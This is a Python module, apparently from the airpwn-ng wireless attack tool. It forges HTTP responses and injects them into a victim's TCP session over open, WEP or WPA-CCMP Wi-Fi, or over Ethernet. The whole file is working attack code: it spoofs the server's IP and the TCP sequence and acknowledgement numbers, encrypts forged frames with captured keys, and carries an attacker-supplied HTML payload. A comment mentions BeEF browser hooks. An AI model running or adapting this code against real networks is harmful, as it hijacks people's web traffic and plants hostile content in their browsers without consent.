import fcntl, socket, struct, sys, time
from binascii import unhexlify
from pyDot11 import *
from scapy.config import * ## Need to scope down at some point in the future
from scapy.layers.dot11 import RadioTap, Dot11, Dot11QoS
from scapy.layers.inet import IP, TCP
from scapy.layers.l2 import Ether, LLC, SNAP
from scapy.packet import Padding, Raw
from scapy.sendrecv import sendp
from scapy.sendrecv import __gen_send as gs
from scapy.utils import wrpcap


class Injector(object):
    """Uses scapy to inject packets on the networks"""

    def __init__(self, interface, args):
        self.interface = interface
        self.args = args
        self.injSocket = conf.L2socket(iface = interface)

        ## Create a header that works for encrypted wifi having FCS
        ### These bytes can be switched up, if memory serves, this is a channel 6 RadioTap()
        # rTap = '00 00 26 00 2f 40 00 a0 20 08 00 a0 20 08 00 00 20 c8 af c8 00 00 00 00 10 6c 85 09 c0 00 d3 00 00 00 d2 00 cd 01'
        # self.rTap = RadioTap(unhexlify(rTap.replace(' ', '')))


    def getHwAddr(self, ifname):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        info = fcntl.ioctl(s.fileno(), 0x8927,  struct.pack('256s', ifname[:15]))
        mac=':'.join(['%02x' % ord(char) for char in info[18:24]])
        return mac


    def inject(self,
               vicmac,
               rtrmac,
               vicip,
               svrip,
               vicport,
               svrport,
               acknum,
               seqnum,
               injection,
               TSVal,
               TSecr):
        """Send the injection using Scapy

        This method is where the actual packet is created for sending
        Things such as payload and associated flags are genned here

        FIN/ACK flag is sent to the victim with this method
        """

        ## HTML headers
        headers =  '\r\n'.join(['HTTP/1.1 200 OK',
                                'Date: {}'.format(time.strftime('%a, %d %b %Y %H:%M:%S GMT', time.gmtime())),
                                'Server: Apache',
                                'Content-Length: {}'.format(len(injection)),
                                'Connection: close',
                                'Content-Type: text/html\r\n\r\n'])

        ## Monitor
        if self.args.inj == 'mon':

            ## WEP/WPA
            if self.args.wep or self.args.wpa:
                # packet = self.rTap\
                packet = RadioTap()\
                         /Dot11(
                               FCfield = 'from-DS',
                               addr1 = vicmac,
                               addr2 = rtrmac,
                               addr3 = rtrmac,
                               subtype = 8L,
                               type = 2
                               )\
                         /Dot11QoS()\
                         /LLC()\
                         /SNAP()\
                         /IP(
                            dst = vicip,
                            src = svrip
                            )\
                         /TCP(
                             flags = 'FA',
                             sport = int(svrport),
                             dport = int(vicport),
                             seq = int(seqnum),
                             ack = int(acknum)
                             )\
                         /Raw(
                             load = headers + injection
                             )
            ## Open
            else:
                packet = RadioTap()\
                         /Dot11(
                               FCfield = 'from-DS',
                               addr1 = vicmac,
                               addr2 = rtrmac,
                               addr3 = rtrmac
                               )\
                         /LLC()\
                         /SNAP()\
                         /IP(
                            dst = vicip,
                            src = svrip
                            )\
                         /TCP(
                             flags = 'FA',
                             sport = int(svrport),
                             dport = int(vicport),
                             seq = int(seqnum),
                             ack = int(acknum)
                             )\
                         /Raw(
                             load = headers + injection
                             )

        ## Managed
        else:
            packet = Ether(src = self.getHwAddr(self.interface), dst=vicmac)\
                     /IP(
                        dst = vicip,
                        src = svrip
                        )\
                     /TCP(
                         flags = 'FA',
                         sport = int(svrport),
                         dport = int(vicport),
                         seq = int(seqnum),
                         ack = int(acknum)
                         )\
                     /Raw(
                         load = headers + injection
                         )

        if TSVal is not None and TSecr is not None:
            packet[TCP].options = [
                                  ('NOP', None),
                                  ('NOP', None),
                                  ('Timestamp', ((round(time.time()), TSVal)))
                                  ]
        else:
            packet[TCP].options = [
                                  ('NOP', None),
                                  ('NOP', None),
                                  ('Timestamp', ((round(time.time()), 0)))
                                  ]

        ## Encrypt if using monitor mode
        if self.args.inj == 'mon':

            ## WPA Injection
            if self.args.wpa is not None:

                ## CCMP
                if self.shake.encDict.get(vicmac) == 'ccmp':
                    try:
                        self.shake.PN[5] += 1
                    except:
                        self.shake.PN[4] += 1
                    packet = wpaEncrypt(self.shake.tgtInfo.get(vicmac)[1],
                                        self.shake.origPkt,
                                        packet,
                                        self.shake.PN,
                                        False) ### DEBUG SET TO FALSE FOR NOW

                ## TKIP, use --inj man as a workaround
                else:
                    print('[!] airpwn-ng cannot inject TKIP natively\n[!] Injection failed\n[!] Use --inj "man" as a workaround')
                    sys.exit()
                    #packet = wpaEncrypt(self.shake.tgtInfo.get(vicmac)[0],
                                        #self.shake.origPkt,
                                        #packet,
                                        #self.shake.PN,
                                        #True)

            ## WEP
            elif self.args.wep is not None:
                packet = wepEncrypt(packet, self.args.wep)


        ## Inject
        print(packet.show())
        print(self.interface)
        sendp(packet, iface = self.interface, verbose = False)
        # gs(self.injSocket, packet, verbose = False)
        print('[*] Packet injected to {0}'.format(vicmac))

        ## Ought be classed up higher so as not to interfere unless warranted
        ### Single packet exit point
        ### Used for BeEF hook examples and such
        # if self.args.single is True:
        #     print('Single Mode Injection called')
        #     sys.exit(0)
